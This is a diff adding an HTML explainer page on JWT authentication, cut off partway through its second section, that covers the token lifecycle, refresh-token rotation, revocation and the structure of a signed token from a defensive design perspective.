@@ -1,0 +1,1260 @@
+<title>JWT Authentication</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,400..800&family=IBM+Plex+Mono:wght@400;500;600&family=Source+Serif+4:ital,opsz,wght@0,8..60,400..700;1,8..60,400..600&display=swap">
+<style>
+/* ============================================================
+   SYSTEM BREAKDOWNS — shared series design system
+   Ground: cool instrument grey. Accent: per-category signal hue,
+   set by the small override block that follows this one.
+   Semantic red/amber/green are constant across the whole series
+   so "threat", "pitfall" and "defence" read identically everywhere.
+   ============================================================ */
+
+:root{
+  --ground:#EAEDF0;
+  --surface:#F8FAFB;
+  --surface-2:#DFE4E9;
+  --sunk:#E2E6EA;
+  --ink:#101418;
+  --ink-2:#3A444E;
+  --ink-3:#68727C;
+  --rule:#C2C9D1;
+  --rule-2:#D5DBE1;
+
+  /* --accent is the only value overridden per category; the two derived
+     tints follow it automatically in both themes via color-mix. */
+  --accent:#2A5A8C;
+  --accent-soft:color-mix(in srgb, var(--accent) 13%, var(--surface));
+  --accent-edge:color-mix(in srgb, var(--accent) 45%, var(--surface));
+
+  --danger:#9C2A2B;  --danger-soft:#F4DFDF;  --danger-edge:#D9A6A6;
+  --warn:#775707;    --warn-soft:#F3EAD1;    --warn-edge:#D9C68C;
+  --safe:#286B43;    --safe-soft:#DBEBE1;    --safe-edge:#A5C9B4;
+
+  --display:"Archivo","Helvetica Neue",Arial,sans-serif;
+  --body:"Source Serif 4",Georgia,"Times New Roman",serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+
+  --shell:1340px;
+  --col:70ch;
+  color-scheme:light;
+}
+
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --ground:#0D1116;
+    --surface:#151B21;
+    --surface-2:#1D252D;
+    --sunk:#111820;
+    --ink:#E6EBEF;
+    --ink-2:#B0BAC3;
+    --ink-3:#848F99;
+    --rule:#2A333C;
+    --rule-2:#1F272F;
+    --accent:#7FB3E0;
+    --danger:#F0817A; --danger-soft:#3A1B19; --danger-edge:#6E3230;
+    --warn:#E2BA51;   --warn-soft:#332A10;   --warn-edge:#65531D;
+    --safe:#63CB88;   --safe-soft:#123020;   --safe-edge:#265539;
+    color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --ground:#0D1116;
+  --surface:#151B21;
+  --surface-2:#1D252D;
+  --sunk:#111820;
+  --ink:#E6EBEF;
+  --ink-2:#B0BAC3;
+  --ink-3:#848F99;
+  --rule:#2A333C;
+  --rule-2:#1F272F;
+  --accent:#7FB3E0;
+  --danger:#F0817A; --danger-soft:#3A1B19; --danger-edge:#6E3230;
+  --warn:#E2BA51;   --warn-soft:#332A10;   --warn-edge:#65531D;
+  --safe:#63CB88;   --safe-soft:#123020;   --safe-edge:#265539;
+  color-scheme:dark;
+}
+
+*,*::before,*::after{box-sizing:border-box;}
+
+body{
+  background:var(--ground);
+  color:var(--ink);
+  font-family:var(--body);
+  font-size:17px;
+  line-height:1.62;
+  font-optical-sizing:auto;
+  -webkit-font-smoothing:antialiased;
+}
+
+h1,h2,h3,h4,h5{
+  font-family:var(--display);
+  font-variation-settings:"wdth" 112;
+  text-wrap:balance;margin:0;line-height:1.1;
+}
+h1{font-size:clamp(2.2rem,5.4vw,3.9rem);font-weight:800;letter-spacing:-.02em;}
+h2{font-size:clamp(1.65rem,3.3vw,2.25rem);font-weight:700;letter-spacing:-.015em;}
+h3{font-size:1.28rem;font-weight:650;letter-spacing:-.005em;line-height:1.22;}
+h4{font-size:1.02rem;font-weight:650;font-variation-settings:"wdth" 100;}
+h5{font-size:.85rem;font-weight:700;font-variation-settings:"wdth" 100;
+   text-transform:uppercase;letter-spacing:.1em;}
+
+p{margin:0;}
+strong{font-weight:700;color:var(--ink);}
+em{font-style:italic;}
+a{color:var(--accent);text-decoration-thickness:1px;text-underline-offset:3px;}
+a:hover{text-decoration-thickness:2px;}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:2px;}
+
+.eyebrow{font-family:var(--mono);font-size:.7rem;font-weight:600;
+  text-transform:uppercase;letter-spacing:.16em;color:var(--ink-3);}
+
+.shell{max-width:var(--shell);margin:0 auto;padding:0 clamp(1rem,3.5vw,2.75rem);}
+
+/* ---------- masthead ---------- */
+.masthead{border-bottom:1px solid var(--rule);
+  background:linear-gradient(180deg,transparent 0%,transparent 68%,var(--surface) 100%);
+  padding-top:clamp(1.75rem,4.5vw,3.25rem);}
+.mast-grid{display:grid;gap:clamp(1.5rem,4vw,3rem);align-items:end;
+  grid-template-columns:minmax(0,1.02fr) minmax(0,.98fr);
+  padding-bottom:clamp(1.5rem,4vw,2.5rem);}
+@media (max-width:980px){.mast-grid{grid-template-columns:1fr;align-items:start;}}
+.mast-kicker{display:flex;flex-wrap:wrap;gap:.5rem 1.1rem;align-items:center;margin-bottom:1rem;}
+.mast-rule{height:1px;flex:1;min-width:2rem;background:var(--rule);}
+.cat{font-family:var(--mono);font-size:.7rem;font-weight:600;text-transform:uppercase;
+  letter-spacing:.14em;color:var(--accent);}
+.mast-sub{font-size:1.1rem;color:var(--ink-2);margin-top:1.05rem;max-width:54ch;line-height:1.55;}
+.mast-meta{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:1.35rem;}
+.chip{font-family:var(--mono);font-size:.67rem;font-weight:500;letter-spacing:.04em;
+  padding:.28rem .55rem;border:1px solid var(--rule);color:var(--ink-2);
+  background:var(--surface);border-radius:2px;}
+.chip--acc{color:var(--accent);border-color:var(--accent-edge);background:var(--accent-soft);}
+.chip--hot{color:var(--danger);border-color:var(--danger-edge);background:var(--danger-soft);}
+
+/* ---------- frame + rail ---------- */
+.frame{display:grid;grid-template-columns:248px minmax(0,1fr);gap:clamp(2rem,4vw,3.5rem);
+  align-items:start;padding-top:2.25rem;padding-bottom:4rem;}
+@media (max-width:1040px){.frame{grid-template-columns:1fr;gap:1.5rem;}}
+.rail{position:sticky;top:1.25rem;max-height:calc(100vh - 2.5rem);overflow-y:auto;
+  font-family:var(--display);font-variation-settings:"wdth" 100;padding-right:.5rem;}
+@media (max-width:1040px){
+  .rail{position:static;max-height:none;border:1px solid var(--rule);
+    background:var(--surface);padding:1rem 1.15rem;border-radius:3px;}}
+.rail h5{color:var(--ink-3);margin-bottom:.8rem;font-family:var(--mono);
+  font-weight:600;letter-spacing:.14em;font-size:.67rem;}
+.rail ol{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;}
+.rail li{position:relative;padding-left:1.3rem;}
+.rail li::before{content:"";position:absolute;left:3px;top:.72em;width:7px;height:7px;
+  border-radius:1px;border:1.5px solid var(--rule);background:var(--ground);z-index:1;}
+@media (max-width:1040px){.rail li::before{background:var(--surface);}}
+.rail li:not(:last-child)::after{content:"";position:absolute;left:6px;top:1.3em;
+  bottom:-.35em;width:1px;background:var(--rule);}
+.rail a{display:block;padding:.25rem 0;font-size:.84rem;line-height:1.3;
+  color:var(--ink-2);text-decoration:none;font-weight:500;}
+.rail a:hover{color:var(--accent);}
+.rail li:hover::before{border-color:var(--accent);background:var(--accent);}
+
+/* ---------- document ---------- */
+.doc{min-width:0;display:flex;flex-direction:column;}
+.doc > section{max-width:100%;}
+.doc p,.doc > section > ul,.doc > section > ol,.doc .lede{max-width:var(--col);}
+.lede{font-size:1.08rem;color:var(--ink-2);line-height:1.55;}
+.part{padding-top:3rem;margin-top:3rem;border-top:1px solid var(--rule);}
+.part:first-child{border-top:0;margin-top:0;padding-top:0;}
+.part-head{margin-bottom:1.4rem;}
+.part-num{font-family:var(--mono);font-size:.71rem;font-weight:600;letter-spacing:.16em;
+  color:var(--accent);text-transform:uppercase;display:block;margin-bottom:.5rem;}
+.doc h2{margin-bottom:.65rem;}
+.doc h3{margin:2.3rem 0 .7rem;color:var(--ink);}
+.doc h4{margin:1.65rem 0 .5rem;color:var(--ink);}
+.doc p + p{margin-top:.85rem;}
+.doc p + h3,.doc ul + h3,.doc ol + h3,.doc pre + h3,.doc .tbl + h3,
+.doc figure + h3,.doc .panel + h3,.doc .defs + h3,.doc .check + h3,
+.doc .duo + h3,.doc .strip + h3,.doc .flow + h3{margin-top:2.5rem;}
+.doc ul,.doc ol{margin:.85rem 0 0;padding-left:1.35rem;display:flex;flex-direction:column;gap:.4rem;}
+.doc li{padding-left:.15rem;}
+.doc li::marker{color:var(--ink-3);}
+.doc ul ul,.doc ol ol,.doc ul ol,.doc ol ul{margin-top:.4rem;}
+
+/* ---------- code ---------- */
+code{font-family:var(--mono);font-size:.855em;font-weight:500;
+  background:var(--sunk);border:1px solid var(--rule-2);
+  padding:.08em .34em;border-radius:2px;color:var(--ink);word-break:break-word;}
+pre{margin:1.1rem 0 0;background:var(--surface);border:1px solid var(--rule);
+  border-left:3px solid var(--accent);padding:.9rem 1.05rem;overflow-x:auto;
+  border-radius:2px;max-width:100%;}
+pre code{background:none;border:0;padding:0;font-size:.795rem;line-height:1.62;
+  display:block;white-space:pre;color:var(--ink-2);}
+pre code b{font-weight:600;color:var(--ink);}
+pre code i{font-style:normal;color:var(--ink-3);}
+pre code u{text-decoration:none;color:var(--danger);font-weight:600;}
+pre code s{text-decoration:none;color:var(--safe);font-weight:600;}
+pre code em{font-style:normal;color:var(--accent);font-weight:600;}
+
+/* ---------- figures ---------- */
+figure{margin:1.8rem 0 0;padding:1.1rem 1.1rem .85rem;background:var(--surface);
+  border:1px solid var(--rule);border-radius:3px;}
+figure svg{display:block;width:100%;height:auto;max-width:100%;color:var(--ink-2);}
+.fig-scroll{overflow-x:auto;}
+.fig-scroll > svg{min-width:560px;}
+figcaption{margin-top:.85rem;padding-top:.7rem;border-top:1px solid var(--rule-2);
+  font-size:.835rem;line-height:1.5;color:var(--ink-3);max-width:80ch;}
+figcaption b{color:var(--ink-2);font-weight:650;}
+
+/* ---------- panels ---------- */
+.panel{margin:1.5rem 0 0;padding:.95rem 1.1rem;border-radius:3px;
+  border:1px solid var(--rule);background:var(--surface);max-width:100%;}
+.panel > :first-child{margin-top:0;}
+.panel p,.panel ul,.panel ol{max-width:none;}
+.panel-label{font-family:var(--mono);font-size:.66rem;font-weight:600;
+  letter-spacing:.14em;text-transform:uppercase;display:block;margin-bottom:.45rem;}
+.panel--threat{background:var(--danger-soft);border-color:var(--danger-edge);}
+.panel--threat .panel-label{color:var(--danger);}
+.panel--pitfall{background:var(--warn-soft);border-color:var(--warn-edge);}
+.panel--pitfall .panel-label{color:var(--warn);}
+.panel--defense{background:var(--safe-soft);border-color:var(--safe-edge);}
+.panel--defense .panel-label{color:var(--safe);}
+.panel--note{background:var(--accent-soft);border-color:var(--accent-edge);}
+.panel--note .panel-label{color:var(--accent);}
+.panel pre{background:var(--surface);border-color:var(--rule-2);border-left-width:2px;}
+.panel code{background:var(--surface);}
+
+/* ---------- tables ---------- */
+.tbl{margin:1.4rem 0 0;overflow-x:auto;border:1px solid var(--rule);
+  border-radius:3px;background:var(--surface);}
+table{border-collapse:collapse;width:100%;font-size:.86rem;line-height:1.45;}
+th,td{text-align:left;padding:.58rem .78rem;border-bottom:1px solid var(--rule-2);vertical-align:top;}
+thead th{font-family:var(--mono);font-size:.66rem;font-weight:600;text-transform:uppercase;
+  letter-spacing:.1em;color:var(--ink-3);background:var(--surface-2);
+  border-bottom:1px solid var(--rule);white-space:nowrap;}
+tbody tr:last-child td{border-bottom:0;}
+td code{font-size:.79rem;}
+td code.nw{white-space:nowrap;}
+.num{font-variant-numeric:tabular-nums;text-align:right;}
+.tag{font-family:var(--mono);font-size:.67rem;font-weight:600;letter-spacing:.03em;
+  padding:.15rem .4rem;border-radius:2px;white-space:nowrap;display:inline-block;}
+.tag--bad{background:var(--danger-soft);color:var(--danger);border:1px solid var(--danger-edge);}
+.tag--mid{background:var(--warn-soft);color:var(--warn);border:1px solid var(--warn-edge);}
+.tag--ok{background:var(--safe-soft);color:var(--safe);border:1px solid var(--safe-edge);}
+.tag--acc{background:var(--accent-soft);color:var(--accent);border:1px solid var(--accent-edge);}
+.tag--neu{background:var(--surface-2);color:var(--ink-3);border:1px solid var(--rule);}
+
+/* ---------- definition grid ---------- */
+.defs{margin:1.3rem 0 0;display:grid;gap:0;border:1px solid var(--rule);
+  border-radius:3px;overflow:hidden;background:var(--surface);}
+.defs > div{display:grid;grid-template-columns:minmax(9rem,15rem) minmax(0,1fr);
+  gap:0 1.05rem;padding:.58rem .82rem;border-bottom:1px solid var(--rule-2);}
+.defs > div:last-child{border-bottom:0;}
+.defs .dt{font-family:var(--mono);font-size:.775rem;font-weight:600;
+  color:var(--accent);word-break:break-word;padding-top:.1rem;}
+.defs .dd{margin:0;font-size:.89rem;line-height:1.5;color:var(--ink-2);}
+.defs .dd code{font-size:.79rem;}
+@media (max-width:620px){.defs > div{grid-template-columns:1fr;gap:.25rem;}}
+
+/* ---------- lifecycle flow (T = 0ms style) ---------- */
+.flow{margin:1.4rem 0 0;border:1px solid var(--rule);border-radius:3px;
+  background:var(--surface);overflow:hidden;}
+.flow > li{list-style:none;display:grid;grid-template-columns:minmax(5.5rem,7rem) minmax(0,1fr);
+  gap:0 1rem;padding:.7rem .9rem;border-bottom:1px solid var(--rule-2);
+  font-size:.9rem;line-height:1.5;position:relative;}
+.flow{padding:0;margin-left:0;}
+.flow > li:last-child{border-bottom:0;}
+.flow .t{font-family:var(--mono);font-size:.72rem;font-weight:600;color:var(--accent);
+  letter-spacing:.02em;padding-top:.15rem;font-variant-numeric:tabular-nums;}
+.flow .s b{display:block;font-weight:650;color:var(--ink);margin-bottom:.1rem;}
+.flow .s{color:var(--ink-2);}
+.flow > li.hot{background:var(--danger-soft);}
+.flow > li.hot .t{color:var(--danger);}
+@media (max-width:560px){.flow > li{grid-template-columns:1fr;gap:.2rem;}}
+
+/* ---------- checklists ---------- */
+.check{margin:1.3rem 0 0;padding:0;list-style:none;display:grid;gap:0;
+  border:1px solid var(--rule);border-radius:3px;background:var(--surface);max-width:none;}
+.check li{display:grid;grid-template-columns:auto minmax(0,1fr);gap:.72rem;
+  padding:.6rem .88rem;border-bottom:1px solid var(--rule-2);font-size:.91rem;line-height:1.5;}
+.check li:last-child{border-bottom:0;}
+.check li::before{content:"";width:13px;height:13px;margin-top:.32rem;border-radius:2px;
+  border:1.5px solid var(--rule);background:var(--ground);}
+.check li b{display:block;font-weight:650;color:var(--ink);}
+.check li code{font-size:.78rem;}
+
+/* ---------- misc layout ---------- */
+.duo{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,18rem),1fr));
+  gap:1rem;margin:1.4rem 0 0;}
+.duo > .panel{margin:0;}
+.strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,10.5rem),1fr));
+  border:1px solid var(--rule);border-radius:3px;overflow:hidden;margin:1.5rem 0 0;
+  background:var(--surface);}
+.strip > div{padding:.8rem .95rem;border-right:1px solid var(--rule-2);}
+.strip > div:last-child{border-right:0;}
+.strip .n{font-family:var(--display);font-variation-settings:"wdth" 108;
+  font-size:1.45rem;font-weight:750;line-height:1;color:var(--ink);font-variant-numeric:tabular-nums;}
+.strip .l{font-family:var(--mono);font-size:.66rem;letter-spacing:.1em;
+  text-transform:uppercase;color:var(--ink-3);margin-top:.38rem;display:block;line-height:1.35;}
+.gloss{columns:2;column-gap:2.5rem;margin:1.4rem 0 0;max-width:none;}
+@media (max-width:760px){.gloss{columns:1;}}
+.gloss > div{break-inside:avoid;margin-bottom:.85rem;font-size:.88rem;line-height:1.5;}
+.gloss .g{font-family:var(--mono);font-size:.79rem;font-weight:600;color:var(--accent);}
+.colophon{border-top:1px solid var(--rule);padding:1.9rem 0 3.5rem;font-size:.83rem;
+  color:var(--ink-3);max-width:72ch;}
+.colophon p + p{margin-top:.65rem;}
+
+/* ---------- diagram primitives ---------- */
+svg .st{stroke:currentColor;fill:none;stroke-width:1.4;}
+svg .st-thin{stroke:currentColor;fill:none;stroke-width:1;}
+svg .st-fat{stroke:currentColor;fill:none;stroke-width:2.2;}
+svg .st-dash{stroke:currentColor;fill:none;stroke-width:1.4;stroke-dasharray:5 3.5;}
+svg .st-dot{stroke:currentColor;fill:none;stroke-width:1.2;stroke-dasharray:1.5 3;}
+svg .rule{stroke:var(--rule);fill:none;stroke-width:1;}
+svg .box{fill:var(--surface);stroke:currentColor;stroke-width:1.3;}
+svg .box-sunk{fill:var(--sunk);stroke:var(--rule);stroke-width:1.1;}
+svg .box-g{fill:var(--ground);stroke:currentColor;stroke-width:1.3;}
+svg .pan-dan{fill:var(--danger-soft);stroke:var(--danger-edge);stroke-width:1.2;}
+svg .pan-saf{fill:var(--safe-soft);stroke:var(--safe-edge);stroke-width:1.2;}
+svg .pan-wrn{fill:var(--warn-soft);stroke:var(--warn-edge);stroke-width:1.2;}
+svg .pan-acc{fill:var(--accent-soft);stroke:var(--accent-edge);stroke-width:1.2;}
+svg text{font-family:var(--mono);font-size:11px;fill:currentColor;}
+svg .t-h{font-family:var(--display);font-variation-settings:"wdth" 100;
+  font-size:12px;font-weight:650;fill:var(--ink);}
+svg .t-lab{font-size:10px;fill:var(--ink-3);letter-spacing:.03em;}
+svg .t-cap{font-size:9px;fill:var(--ink-3);letter-spacing:.08em;text-transform:uppercase;}
+svg .t-sm{font-size:9px;fill:var(--ink-3);}
+svg .t-hash{font-size:10px;fill:var(--ink-2);}
+svg .c-acc{color:var(--accent);}
+svg .c-dan{color:var(--danger);}
+svg .c-saf{color:var(--safe);}
+svg .c-wrn{color:var(--warn);}
+svg .c-ink{color:var(--ink);}
+svg .c-mute{color:var(--ink-3);}
+svg .f-acc{fill:var(--accent);}
+svg .f-dan{fill:var(--danger);}
+svg .f-saf{fill:var(--safe);}
+svg .f-wrn{fill:var(--warn);}
+svg .f-ink{fill:var(--ink);}
+svg .f-ink2{fill:var(--ink-2);}
+svg .f-ink3{fill:var(--ink-3);}
+svg .f-cur{fill:currentColor;}
+svg .f-surf{fill:var(--surface);}
+svg .f-none{fill:none;}
+
+@media (prefers-reduced-motion: reduce){
+  *{animation-duration:.01ms !important;transition-duration:.01ms !important;
+    scroll-behavior:auto !important;}
+}
+html{scroll-behavior:smooth;scroll-padding-top:1.5rem;}
+</style>
+<style>:root{--accent:#3B4CA8;}@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--accent:#8FA0F5;}}:root[data-theme="dark"]{--accent:#8FA0F5;}</style>
+<header class="masthead">
+  <div class="shell">
+    <div class="mast-grid">
+      <div>
+        <div class="mast-kicker">
+          <span class="cat">Authentication Systems</span>
+          <span class="mast-rule"></span>
+          <span class="eyebrow">13 Sections</span>
+        </div>
+        <h1>JWT Authentication</h1>
+        <p class="mast-sub">Short-lived signed access tokens, long-lived opaque refresh tokens, and
+          the family-based rotation that turns a stolen token into an alarm. Plus every way the
+          pattern is implemented wrong.</p>
+        <div class="mast-meta">
+          <span class="chip chip--acc">RS256</span>
+          <span class="chip">refresh rotation</span>
+          <span class="chip">JWKS &amp; kid</span>
+          <span class="chip">Argon2id</span>
+          <span class="chip">jti blacklist</span>
+          <span class="chip chip--hot">alg confusion</span>
+          <span class="chip chip--hot">aud bypass</span>
+          <span class="chip chip--hot">KDF denial of service</span>
+        </div>
+      </div>
+
+      <figure style="margin:0;">
+        <div class="fig-scroll">
+        <svg viewBox="0 0 580 310" role="img" aria-label="The token lifecycle. Login costs one expensive password hash and returns a fifteen-minute access token plus a thirty-day refresh token. Resource requests validate the access token locally with no network call. When it expires the refresh endpoint rotates both tokens against a database record. Logout revokes the refresh token and blacklists the access token's identifier until it would have expired anyway.">
+          <defs>
+            <marker id="h-ar" markerWidth="7" markerHeight="7" refX="6.4" refY="3" orient="auto">
+              <path d="M0,0 L6.4,3 L0,6 z" class="f-ink2"/>
+            </marker>
+            <marker id="h-ars" markerWidth="7" markerHeight="7" refX="6.4" refY="3" orient="auto">
+              <path d="M0,0 L6.4,3 L0,6 z" class="f-saf"/>
+            </marker>
+          </defs>
+          <text class="t-cap" x="0" y="12">one expensive login, then fifteen minutes of free validation</text>
+          <line class="rule" x1="0" y1="20" x2="580" y2="20"/>
+
+          <rect class="box c-acc" x="0" y="32" width="580" height="58" rx="3"/>
+          <text class="t-lab" x="12" y="50" style="fill:var(--accent);font-weight:600">POST /auth/login</text>
+          <text class="t-lab" x="140" y="50" style="font-size:9px">Argon2id ≈ 300 ms · 64 MB · the only deliberately slow step in the system</text>
+          <text class="t-lab" x="12" y="70">→ <b>access_token</b> — signed JWT, 15 min, held in memory</text>
+          <text class="t-lab" x="12" y="84">→ <b>refresh_token</b> — 256 random bits, 30 days, HttpOnly cookie, <i>only its SHA-256 is stored</i></text>
+
+          <line class="st" x1="290" y1="92" x2="290" y2="104" marker-end="url(#h-ar)"/>
+
+          <rect class="pan-saf" x="0" y="108" width="580" height="56" rx="3"/>
+          <text class="t-lab" x="12" y="126" style="fill:var(--safe);font-weight:600">GET /api/… Authorization: Bearer …</text>
+          <text class="t-lab" x="12" y="146">verified LOCALLY with the public key. <b>No network call. No database. 0.5–2 ms.</b></text>
+          <text class="t-lab" x="12" y="158" style="font-size:9px">this is the entire reason JWTs exist — and the reason revocation is hard</text>
+
+          <line class="st" x1="290" y1="166" x2="290" y2="178" marker-end="url(#h-ar)"/>
+
+          <rect class="box" x="0" y="182" width="580" height="56" rx="3"/>
+          <text class="t-lab" x="12" y="200" style="font-weight:600">POST /auth/token/refresh   <i>— 15 minutes later</i></text>
+          <text class="t-lab" x="12" y="220">hash the presented token → look it up → <b>issue a NEW pair, revoke the old one</b></text>
+          <text class="t-lab" x="12" y="232" style="font-size:9px">same family_id carries through the chain, which is what makes theft detectable</text>
+
+          <line class="st" x1="290" y1="240" x2="290" y2="252" marker-end="url(#h-ar)"/>
+
+          <rect class="box-sunk" x="0" y="256" width="580" height="44" rx="3"/>
+          <text class="t-lab" x="12" y="274" style="font-weight:600">POST /auth/logout</text>
+          <text class="t-lab" x="140" y="274" style="font-size:9px">revoke the refresh token · blacklist the access token's jti in Redis</text>
+          <text class="t-lab" x="140" y="290" style="font-size:9px">TTL of the blacklist entry = the token's remaining life, so the list stays small on its own</text>
+        </svg>
+        </div>
+        <figcaption>The asymmetry is deliberate. Access tokens are <b>self-contained and unrevocable</b>, so
+          they are kept short. Refresh tokens are <b>opaque and stateful</b>, so they can be revoked
+          instantly but cost a database round trip. Every design question in this document is about
+          where you place that line.</figcaption>
+      </figure>
+    </div>
+  </div>
+</header>
+
+<div class="shell">
+<div class="frame">
+
+<nav class="rail" aria-label="Contents">
+  <h5>Contents</h5>
+  <ol>
+    <li><a href="#s01">01 &nbsp;The lifecycle</a></li>
+    <li><a href="#s02">02 &nbsp;Anatomy of the token</a></li>
+    <li><a href="#s03">03 &nbsp;The validation pipeline</a></li>
+    <li><a href="#s04">04 &nbsp;Rotation and families</a></li>
+    <li><a href="#s05">05 &nbsp;Where tokens live</a></li>
+    <li><a href="#s06">06 &nbsp;Keys and rotation</a></li>
+    <li><a href="#s07">07 &nbsp;Password hashing</a></li>
+    <li><a href="#s08">08 &nbsp;Sessions versus tokens</a></li>
+    <li><a href="#s09">09 &nbsp;Forging tokens</a></li>
+    <li><a href="#s10">10 &nbsp;Stealing and misusing them</a></li>
+    <li><a href="#s11">11 &nbsp;Failure modes</a></li>
+    <li><a href="#s12">12 &nbsp;Observability</a></li>
+    <li><a href="#s13">13 &nbsp;Scaling and drills</a></li>
+  </ol>
+</nav>
+
+<main class="doc">
+
+<!-- ============================================ 01 -->
+<section class="part" id="s01">
+  <div class="part-head">
+    <span class="part-num">01 — Narrative</span>
+    <h2>The lifecycle</h2>
+  </div>
+  <p class="lede">RS256 throughout: the auth service signs with an RSA private key, resource APIs
+    verify with the public key. Resource APIs therefore never hold anything that can mint a token,
+    which is the single most important architectural decision here.</p>
+
+  <ul class="flow">
+    <li><span class="t">T+0</span><span class="s"><b>Credential submission</b>
+      A plain POST with email and password. Rate limiting runs <em>before</em> any hashing, keyed on the
+      email rather than only the IP, because a distributed attacker makes few requests per address.</span></li>
+    <li><span class="t">T+200–400 ms</span><span class="s"><b>Verification</b>
+      Look up the user, run Argon2id against the stored hash, and compare with a
+      <b>constant-time</b> function. The 300 ms is not a performance problem, it is the product.</span></li>
+    <li><span class="t">T+400 ms</span><span class="s"><b>Issuance</b>
+      Sign a JWT with a 15-minute expiry and a UUIDv4 <code>jti</code>. Generate 32 random bytes as the refresh
+      token, return the plaintext to the client exactly once, and persist only
+      <code>SHA-256(token)</code> along with a <code>family_id</code>, an IP hash and a user-agent hash.</span></li>
+    <li><span class="t">steady state</span><span class="s"><b>Resource access</b>
+      Every API call carries the JWT. The resource API verifies the signature locally against a cached
+      public key. No call to the auth service, no database read. This is why a JWT fleet scales
+      horizontally with no shared state.</span></li>
+    <li><span class="t">T+15 min</span><span class="s"><b>Silent refresh</b>
+      The client detects expiry, either proactively by reading <code>exp</code> or reactively on a 401. The
+      refresh endpoint hashes the presented token, finds an unrevoked unexpired record, issues a new
+      pair, and marks the old one consumed. The user notices nothing.</span></li>
+    <li><span class="t">logout</span><span class="s"><b>Revocation</b>
+      Revoke the refresh token record and add the access token's <code>jti</code> to Redis with a TTL equal to
+      its remaining life. The blacklist can therefore never grow beyond one entry per concurrent
+      user, and expired tokens are rejected by <code>exp</code> without touching Redis at all.</span></li>
+  </ul>
+
+  <div class="panel panel--note">
+    <span class="panel-label">Latency budget, for calibration</span>
+    <div class="strip" style="margin-top:.6rem">
+      <div><span class="n">300 ms</span><span class="l">Argon2id — deliberate</span></div>
+      <div><span class="n">3 ms</span><span class="l">RSA sign</span></div>
+      <div><span class="n">1 ms</span><span class="l">RSA verify per request</span></div>
+      <div><span class="n">8 ms</span><span class="l">refresh token DB write</span></div>
+    </div>
+    <p style="margin-top:.8rem">Login is ~350 ms and dominated entirely by the key derivation
+      function. Every subsequent request is ~1 ms. If your login latency is not dominated by the KDF,
+      your KDF parameters are too weak.</p>
+  </div>
+</section>
+
+<!-- ============================================ 02 -->
+<section class="part" id="s02">
+  <div class="part-head">
+    <span class="part-num">02 — Structure</span>
+    <h2>Anatomy of the token</h2>
+  </div>
+
+  <figure>
+    <div class="fig-scroll">
+    <svg viewBox="0 0 700 320" role="img" aria-label="A JWT broken into its three base64url segments. The header names the algorithm and the key id. The payload carries issuer, subject, audience, issued-at, expiry, a unique token id and authorization claims. The signature is computed over the first two segments joined by a dot, hashed with SHA-256 and signed with the RSA private key. The payload is encoded, not encrypted, so anyone holding the token can read it.">
+      <text class="t-cap" x="0" y="12">header . payload . signature — each base64url, no padding</text>
+      <line class="rule" x1="0" y1="20" x2="700" y2="20"/>
+
+      <rect class="pan-acc" x="0" y="32" width="212" height="120" rx="3"/>
+      <text class="t-lab" x="12" y="50" style="fill:var(--accent);font-weight:600">HEADER</text>
+      <text class="t-lab" x="12" y="72" style="font-size:9px">"alg": "RS256"</text>
+      <text class="t-lab" x="12" y="86" style="font-size:9px;fill:var(--danger)">  ← never used to SELECT the verifier</text>
+      <text class="t-lab" x="12" y="104" style="font-size:9px">"typ": "JWT"</text>
+      <text class="t-lab" x="12" y="122" style="font-size:9px">"kid": "key-2024-01"</text>
+      <text class="t-lab" x="12" y="136" style="font-size:9px">  ← which public key to use</text>
+
+      <rect class="box" x="222" y="32" width="256" height="120" rx="3"/>
+      <text class="t-lab" x="234" y="50" style="font-weight:600">PAYLOAD</text>
+      <text class="t-lab" x="234" y="68" style="font-size:9px">iss — must match exactly</text>
+      <text class="t-lab" x="234" y="82" style="font-size:9px">sub — the stable user id, never the email</text>
+      <text class="t-lab" x="234" y="96" style="font-size:9px">aud — who may accept this token</text>
+      <text class="t-lab" x="234" y="110" style="font-size:9px">iat · exp — 15 minutes apart</text>
+      <text class="t-lab" x="234" y="124" style="font-size:9px">jti — UUIDv4, enables precise revocation</text>
+      <text class="t-lab" x="234" y="138" style="font-size:9px">roles · scope — trusted at face value</text>
+
+      <rect class="box" x="488" y="32" width="212" height="120" rx="3"/>
+      <text class="t-lab" x="500" y="50" style="font-weight:600">SIGNATURE</text>
+      <text class="t-lab" x="500" y="72" style="font-size:9px">signing_input =</text>
+      <text class="t-lab" x="500" y="86" style="font-size:9px">  b64(header) + "." + b64(payload)</text>
+      <text class="t-lab" x="500" y="106" style="font-size:9px">sig = RSA_sign(</text>
+      <text class="t-lab" x="500" y="120" style="font-size:9px">        SHA256(signing_input),</text>
+      <text class="t-lab" x="500" y="134" style="font-size:9px">        private_key)</text>
+
+      <line class="rule" x1="0" y1="172" x2="700" y2="172"/>
+      <rect class="pan-dan" x="0" y="184" width="700" height="60" rx="3"/>
+      <text class="t-lab" x="12" y="204" style="fill:var(--danger);font-weight:600">BASE64URL IS ENCODING, NOT ENCRYPTION</text>
+      <text class="t-lab" x="12" y="222">Anyone holding the token reads the payload with one shell command. The signature proves INTEGRITY, not confidentiality.</text>
+      <text class="t-lab" x="12" y="238" style="font-size:9px">Never put PII, salaries, internal hostnames or secrets in a payload. Only what authorization needs. JWE exists for the rare case that is not enough.</text>
+
+      <rect class="pan-wrn" x="0" y="256" width="700" height="60" rx="3"/>
+      <text class="t-lab" x="12" y="276" style="fill:var(--warn);font-weight:600">CLAIMS ARE A SNAPSHOT, NOT A LOOKUP</text>
+      <text class="t-lab" x="12" y="294">Demoting a user in the database does not change the roles in their active tokens. They keep admin until exp.</text>
+      <text class="t-lab" x="12" y="310" style="font-size:9px">This is THE fundamental JWT tradeoff. Every mitigation — short TTL, blacklist, version counter — is a way of buying it back.</text>
+    </svg>
+    </div>
+    <figcaption>Typical RS256 token size is 600–900 bytes, sent on <b>every single request</b>. That is
